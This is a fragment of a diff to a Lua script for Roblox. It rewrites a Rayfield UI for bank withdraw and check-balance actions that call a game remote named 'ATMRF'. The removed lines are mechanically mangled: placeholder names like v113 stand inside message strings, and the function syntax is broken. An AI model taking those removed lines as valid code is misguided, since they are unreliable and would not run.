                 Title = "Error",
-                Content = "Invalid deposit v113.",
+                Content = "Invalid deposit amount.",
                 Duration = 4
             })
         end
     end
 })
-v006:CreateInput({
+
+-- Withdraw input
+MainTab:CreateInput({
     Name = "Withdraw",
-    PlaceholderText = "Enter v113 to withdraw",
+    PlaceholderText = "Enter amount to withdraw",
     RemoveTextAfterFocusLost = true,
-    Callback = v012(input)
-        local v113 = tonumber(input)
-        if v113 then
-            if v113 <= v112 then
-                v112 = v112 - v113
-                game:GetService("v009"):WaitForChild("ATMRF"):InvokeServer("withdraw", v113)
-                v001:Notify({
+    Callback = function(input)
+        local amount = tonumber(input)
+        if amount then
+            if amount <= bankBalance then
+                bankBalance = bankBalance - amount
+                game:GetService("ReplicatedStorage"):WaitForChild("ATMRF"):InvokeServer("withdraw", amount)
+
+                Rayfield:Notify({
                     Title = "Withdraw Complete",
-                    Content = "Withdrew $" .. v113 .. "\nNew Balance: $" .. v112,
+                    Content = "Withdrew $" .. amount .. "\nNew Balance: $" .. bankBalance,
                     Duration = 5
                 })
             else
-                v001:Notify({
+                Rayfield:Notify({
                     Title = "Error",
                     Content = "Insufficient funds.",
                     Duration = 4
                 })
             end
         else
-            v001:Notify({
+            Rayfield:Notify({
                 Title = "Error",
-                Content = "Invalid withdraw v113.",
+                Content = "Invalid withdraw amount.",
                 Duration = 4
             })
         end
     end
 })
-v006:CreateButton({
+
+-- Check balance button
+MainTab:CreateButton({
     Name = "Check Balance",
-    Callback = v012()
-        v001:Notify({
+    Callback = function()
+        Rayfield:Notify({
             Title = "Bank Balance",
-            Content = "Current Balance: $" .. v112,
+            Content = "Current Balance: $" .. bankBalance,
             Duration = 5
         })
     end
